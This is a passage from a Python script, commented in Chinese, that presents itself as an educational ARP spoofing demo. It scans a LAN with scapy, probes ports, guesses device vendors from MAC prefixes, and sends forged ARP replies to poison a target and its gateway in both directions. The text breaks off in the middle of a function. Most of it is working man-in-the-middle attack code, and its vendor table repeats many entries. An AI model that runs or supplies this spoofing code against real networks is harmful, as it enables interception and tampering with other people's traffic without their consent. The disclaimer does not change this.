#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级ARP欺骗演示程序 - 教育用途
包含多种优化和功能增强

⚠️ 重要提醒：仅供学习和授权的安全测试使用
"""

import os
import sys
import time
import socket
import threading
import json
from datetime import datetime
from scapy.all import ARP, Ether, srp, send, sniff, conf
from scapy.layers.l2 import arping

class AdvancedARPSpoof:
    def __init__(self):
        self.is_running = False
        self.packet_count = 0
        self.start_time = None
        self.targets = []
        self.interface = None
        self.log_file = "arp_spoof_log.json"
        
        # 配置优化
        conf.verb = 0  # 减少scapy输出
        
    def get_network_info(self):
        """获取网络信息"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # 获取网关（简化版）
            gateway = f"{'.'.join(local_ip.split('.')[:-1])}.1"
            
            return local_ip, gateway
        except:
            return "192.168.1.100", "192.168.1.1"
    
    def intelligent_scan(self, ip_range="192.168.1.0/24"):
        """智能网络扫描"""
        print(f"[+] 智能扫描网络: {ip_range}")
        
        devices = []
        
        # 方法1: 使用arping（Layer 3）
        try:
            ans, unans = arping(ip_range, verbose=False, timeout=2)
            for sent, received in ans:
                devices.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'method': 'ARPing',
                    'timestamp': datetime.now().isoformat()
                })
        except:
            pass
        
        # 方法2: 端口快速扫描
        common_ports = [80, 443, 22, 53]
        for device in devices[:5]:  # 只扫描前5个设备
            for port in common_ports:
                if self.port_quick_check(device['ip'], port):
                    device['open_ports'] = device.get('open_ports', []) + [port]
        
        # 设备分类
        for device in devices:
            device['type'] = self.classify_device(device)
        
        return devices
    
    def port_quick_check(self, ip, port, timeout=1):
        """快速端口检查"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def classify_device(self, device):
        """设备类型分类"""
        ip = device['ip']
        mac = device['mac'].lower()
        
        # 基于MAC地址前3位识别厂商
        vendor_oui = mac[:8]
        common_vendors = {
            '00:50:56': 'VMware',
            '00:0c:29': 'VMware',
            '00:1b:21': 'Cisco',
            '00:15:5d': 'Microsoft',
            '00:50:f2': 'Microsoft',
            '00:1a:11': 'Dell',
            '00:19:b9': 'Dell',
            '00:14:22': 'HP',
            '00:18:fe': 'HP',
            '00:1e:c9': 'HP',
            '00:25:bc': 'Intel',
            '00:13:ce': 'Intel',
            '00:1b:77': 'Intel',
            '00:1c:c0': 'Fujitsu',
            '00:0f:fe': 'Fujitsu',
            '00:1e:33': 'Fujitsu',
            '00:0d:60': 'Samsung',
            '00:12:47': 'Samsung',
            '00:15:99': 'Samsung',
            '00:16:32': 'Compal',
            '00:19:7d': 'Compal',
            '00:1e:68': 'Compal',
            '00:21:5c': 'Compal',
            '00:24:21': 'Compal',
            '00:26:22': 'Compal',
            '00:90:4b': 'Cisco',
            '00:0c:41': 'Cisco',
            '00:0f:8f': 'Cisco',
            '00:1b:0c': 'Cisco',
            '00:1c:0e': 'Cisco',
            '00:1d:45': 'Cisco',
            '00:1e:7d': 'Cisco',
            '00:1f:6c': 'Cisco',
            '00:21:1b': 'Cisco',
            '00:22:55': 'Cisco',
            '00:23:04': 'Cisco',
            '00:24:14': 'Cisco',
            '00:25:00': 'Cisco',
            '00:26:0b': 'Cisco',
            '00:26:98': 'Cisco',
            '00:50:56': 'VMware',
            '00:0c:29': 'VMware',
            '00:1c:14': 'VMware',
            '00:05:69': 'VMware',
            '00:50:f2': 'Microsoft',
            '00:03:ff': 'Microsoft',
            '00:15:5d': 'Microsoft',
            '00:0d:3a': 'Microsoft',
            '00:12:5a': 'Microsoft',
            '00:1d:60': 'Microsoft',
            '00:25:ae': 'Microsoft',
            '00:50:f2': 'Microsoft',
            '00:0f:fe': 'Fujitsu',
            '00:1c:c0': 'Fujitsu',
            '00:1e:33': 'Fujitsu',
            '00:0d:60': 'Samsung',
            '00:12:47': 'Samsung',
            '00:15:99': 'Samsung',
            '00:16:32': 'Compal',
            '00:19:7d': 'Compal',
            '00:1e:68': 'Compal',
            '00:21:5c': 'Compal',
            '00:24:21': 'Compal',
            '00:26:22': 'Compal',
            '00:0c:29': 'VMware',
            '00:50:56': 'VMware',
            '00:1c:14': 'VMware',
            '00:05:69': 'VMware',
            '00:0f:4b': 'VMware',
            '00:1c:42': 'VMware',
            '00:50:f2': 'Microsoft',
            '00:03:ff': 'Microsoft',
            '00:15:5d': 'Microsoft',
            '00:0d:3a': 'Microsoft',
            '00:12:5a': 'Microsoft',
            '00:1d:60': 'Microsoft',
            '00:25:ae': 'Microsoft',
            '00:50:f2': 'Microsoft'
        }
        
        vendor = common_vendors.get(vendor_oui, '未知厂商')
        
        # 基于IP和端口信息进一步分类
        if ip.endswith('.1') or ip.endswith('.254'):
            return f"网络设备 ({vendor})"
        elif 'open_ports' in device and any(p in [22, 23] for p in device['open_ports']):
            return f"服务器 ({vendor})"
        elif 'open_ports' in device and any(p in [80, 443, 8080] for p in device['open_ports']):
            return f"Web服务器 ({vendor})"
        else:
            return f"客户端设备 ({vendor})"
    
    def advanced_spoof(self, target_ip, gateway_ip, spoof_type="bidirectional"):
        """高级ARP欺骗"""
        try:
            # 获取MAC地址
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            
            if not target_mac or not gateway_mac:
                return False
            
            if spoof_type == "bidirectional":
                # 双向欺骗
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet1, verbose=False)
                send(packet2, verbose=False)
                self.packet_count += 2
                
            elif spoof_type == "target_only":
                # 仅欺骗目标
                packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet, verbose=False)
                self.packet_count += 1
                
            elif spoof_type == "gateway_only":
                # 仅欺骗网关
                packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc